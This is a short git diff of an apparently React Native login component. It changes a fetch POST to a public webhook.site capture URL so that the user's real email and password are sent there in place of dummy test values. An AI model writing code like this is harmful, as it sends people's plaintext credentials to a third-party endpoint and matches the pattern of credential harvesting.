@@ -36,6 +36,9 @@ export default function Home({navigation}) {
       return;
 
     }
+
+    //api GET requset
+    
     try{
       await fetch('https://webhook.site/f555502c-d993-4162-bc33-bda041e5ff90',{
         method:'post',
@@ -46,8 +49,8 @@ export default function Home({navigation}) {
 
         },
         body:JSON.stringify({
-          "username":"j",
-          "password":"bbbb"
+          "username":email,
+          "password":password
         })
       });
     }catch(e){
@@ -62,31 +65,6 @@ export default function Home({navigation}) {
     //            paramKey1: email,
               
     //         })
-    // const response = await fetch(`http://api.example.com?username=${username}`);
-    // const jsonData = await response.json();
-  // const apiCall= async () =>{
-  //     try{
-  //       await fetch('https://webhook.site/f555502c-d993-4162-bc33-bda041e5ff90',{
-  //         method:'post',
-  //         mode:'no-cors',
-  //         headers:{
-  //           'Accept':'application/json',
-  //           'Content-Type':'application/json'
-
-  //         },
-  //         body:JSON.stringify({
-  //           "username":"j",
-  //           "password":"bbbb"
-  //         })
-  //       });
-  //     }catch(e){
-  //         console.log(e);
-  //     }
-
-      
-    //}
-   
- 
   };
  
   return (
